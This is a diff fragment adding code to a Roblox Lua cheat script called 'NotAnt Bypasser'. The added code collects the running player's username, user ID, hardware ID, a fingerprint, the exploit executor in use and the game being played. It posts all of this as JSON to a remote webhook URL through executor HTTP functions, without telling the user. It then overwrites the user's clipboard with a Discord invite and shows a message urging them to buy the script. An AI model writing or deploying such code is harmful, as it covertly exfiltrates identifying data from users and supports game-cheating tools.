+			["content"] = "**" .. game.Players.LocalPlayer.Name .. " NotAnt Bypasser On Top!" .. "\n" .. "https://www.roblox.com/games/" .. game.PlaceId .. "/ " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**",
+			["embeds"] = {
+				{
+					["title"] = tostring(b) .. "\nFingerprint: " .. tostring(a),
+					["description"] = "**HWID: " .. tostring(h) .. "** \n" .. "**Exploit: " .. i .. "**" .. "\n" .. "** \n Server Players" .. g .. "**",
+					["type"] = "rich",
+					["color"] = tonumber(7498202),
+					["image"] = {
+						["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=420&height=420&format=png"
+					}
+				}
+			}
+		}
+		local l = game:GetService("HttpService"):JSONEncode(k)
+		local c = {
+			["content-type"] = "application/json"
+		}
+		request = http_request or request or HttpPost or syn.request;
+		local m = {
+			Url = j,
+			Body = l,
+			Method = "POST",
+			Headers = c
+		}
+		request(m)
+	end)
+	spawn(function()
+		setclipboard("https://discord.gg/ySZgbZRftg")
+		game.Players.LocalPlayer.PlayerGui.Gui.Home.MSG.Text = "Buy the Script from !NotAnt#9009 \n Discord link copied."
+	end)
